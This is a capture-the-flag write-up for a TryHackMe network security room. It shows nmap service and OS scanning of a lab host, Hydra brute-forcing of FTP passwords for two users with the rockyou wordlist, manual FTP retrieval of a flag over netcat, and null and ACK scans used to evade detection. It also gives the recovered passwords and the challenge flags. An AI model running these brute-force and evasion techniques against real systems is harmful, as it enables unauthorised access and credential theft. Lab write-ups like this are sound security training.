# Net Sec Challenge

This CTF is just a series of questions. All should be solvable using nmap, telnet, and Hydra… Though I'm going to substitute netcat for telnet. However, I'm sticking to the spirit of things, and will only use those three tools.

The target machine is 10.10.152.115.

We'll start off with a full nmap scan:

```bash
sudo nmap -v -oN net-sec-challenge -Pn -A --reason -T4 \
          -p- 10.10.152.115
```

Results:

```
# Nmap 7.92 scan initiated Sun Apr  3 20:48:04 2022 as: nmap -v -oN net-sec-challenge -Pn -A --reason -T4 -p- 10.10.152.115
Increasing send delay for 10.10.152.115 from 0 to 5 due to 909 out of 2271 dropped probes since last increase.
Increasing send delay for 10.10.152.115 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 10.10.152.115
Host is up, received user-set (0.19s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 (protocol 2.0)
| ssh-hostkey: 
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
|_  256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        syn-ack ttl 61 lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hello, world!
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=4/3%Time=624A60E5%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-OpenSSH_8\.2p1 THM{946219583339}
");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=32245%PV=Y%DS=4%DC=T%G=Y%TM=624A6111
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 12.801 days (since Tue Mar 22 01:54:39 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   NETSEC-CHALLENG<00>  Flags: <unique><active>
|   NETSEC-CHALLENG<03>  Flags: <unique><active>
|   NETSEC-CHALLENG<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2022-04-04T03:07:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   47.27 ms  10.13.0.1
2   ... 3
4   222.58 ms 10.10.152.115

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  3 21:08:01 2022 -- 1 IP address (1 host up) scanned in 1197.32 seconds
```

This enables us to answer a set of questions immediately.

> What is the highest port number being open less than 10,000? - 8080
>
> There is an open port outside the common 1000 ports; it is above 10,000. What is it? - 10021
>
> How many TCP ports are open? - 6
>
> What is the flag hidden in the HTTP server header? - THM{web_server_25352}
>
> What is the flag hidden in the SSH server header? - THM{946219583339}
>
> We have an FTP server listening on a nonstandard port. What is the version of the FTP server? - vsftpd 3.0.3

That's all pretty easy. The next one is a bit harder with our limited toolset…

We start off by attempting to brute force the password for `eddie` or `quinn` using Hydra. To do this, we're going to run two Hydra tasks in parallel.

```bash
# Hydra task to break eddie's password.
#
hydra -v -f -t 10 -s 10021 -l eddie \
      -P ~/.local/share/red-team/wordlists/rockyou.txt \
         10.10.152.115 ftp

# Hydra task to break quinn's password.
#
hydra -v -f -t 10 -s 10021 -l quinn \
      -P ~/.local/share/red-team/wordlists/rockyou.txt \
         10.10.152.115 ftp
```

These quickly return the results `eddie:jordan` and `quinn:andrea`. Let's try to use `nc -nv 10.10.152.115 10021` to log into `eddie`'s account.

```ftp
(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER eddie
331 Please specify the password.
PASS jordan
230 Login successful.
425 Use PORT or PASV first.
PASV
227 Entering Passive Mode (10,10,152,115,119,101).
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```

The trick here is that the passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 - o4 are the four octets of the server's IP address (10.10.152.115), and p1 - p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, `nc -nv 10.10.152.115 30565`. We start this *before* entering the LIST command, revealing that `eddie` has access to no files.

Let's have the same conversation for `quinn`.

```ftp
(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
PASV
227 Entering Passive Mode (10,10,152,115,120,34).
LIST
150 Here comes the directory listing.
226 Directory send OK.
PASV
227 Entering Passive Mode (10,10,152,115,117,85).
RETR ftp_flag.txt
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
QUIT
221 Goodbye.
```

This time we need to open *two* auxiliary netcat sessions. The first, `nc -nv 10.10.152.115 30754`, catches the LIST command, which reveals that `quinn` has access to an `ftp_flag.txt` file. The second, `nc -nv 10.10.152.115 30037`, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.

> We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP? - THM{321452667098}

For the final challenge, we go to `http://10.10.152.115:8080`. The challenge is to scan 10.10.152.115 "as covertly as possible". I'm not really willing to wait 7 months for a scan, but I'll bet that all we need to do is use `-T1` and drop `-A`.

```bash
sudo nmap -v -Pn -n -T1 -p- 10.10.152.115
```

Well, that didn't work - "71% chance of scan being detected" and we're nowhere near done. That, and the machine expired without me even noticing.

New target IP is 10.10.34.244.

Maybe speed doesn't matter here? Let's try a scan that shouldn't even look like a connection - an ACK scan - but at a more "normal" rate.

```bash
sudo nmap -v -Pn -n -T4 -sA -p- 10.10.34.244
```

Well, that resulted in an almost immediate flag. Switching to `-T2` for the timing here also incremented things quite quickly.

What about a null scan? That might actually get me more information than an ACK scan, but should elicit *any* response from open ports.

```bash
sudo nmap -v -Pn -n -T4 -sN -p- 10.10.34.244
```

"Null scan" is apparently the right answer, as the challenge provided the flag almost immediately (which doesn't *actually* make any sense, but whatever…).

> Browsing to http://10.10.152.115:8080 displays a small challenge that will give you a flag once you solve it. What is the flag? - THM{f7443f99}

* [Using "nmap"](../Notes/Using%20%22nmap%22.md)
* [Using Hydra](../Notes/Using%20Hydra.md)
* [Using "netcat"](../Notes/Using%20%22netcat%22.md)
* [File Transfer Protocol (FTP)](../Notes/File%20Transfer%20Protocol%20%28FTP%29.md)
* [How to list FTP directories using telnet?](https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402)
* [FTP Commands: QUIT, USER, ABOR, ACCT, SYST, XDEL](https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command)
* [FTP Commands: APPE, MLSD, MLST, LIST, RETR, STOR, STOU](https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command)

ELAPSED TIME: 2 h 31 min

## References

* [TryHackMe: Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)
